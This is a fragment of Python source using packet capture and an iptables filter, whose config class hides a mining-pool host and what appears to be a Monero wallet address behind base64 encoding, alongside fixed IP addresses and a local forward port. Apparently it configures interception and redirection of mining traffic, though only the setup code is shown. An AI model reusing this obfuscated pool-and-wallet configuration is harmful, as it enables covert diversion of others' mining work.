#-*- encoding: utf-8 -*-
import pcap
import dpkt
import threading
import iptablesfilter
from threading import Timer
import time
import socket
import base64

class config(object):
    forwardip = '127.0.0.1'
    forwardport= '17998'

    default_host='eG1yLXVzYS5kd2FyZnBvb2wuY29t'
    default_port='8050'

    ip_list=['144.217.61.241','144.217.101.20','66.70.234.210','144.217.117.111']

    default_user='NDM4THBRbkNVU2VmeTlFZHdwNmNGb04xQTQyNGNxUk1QMzhOU3NNNnZpTUY1amd6Q2VqN1dQaWhxbXU1MVJMYkpLSHZLdnR3c2RmUWtBWERudm5UMlBMOUYxZ0g2VUw='
    def __init__(self):
        host = base64.b64decode(self.default_host)
        self.dhost = socket.gethostbyname(host)
        self.dport = self.default_port
        self.user = base64.b64decode(self.default_user)
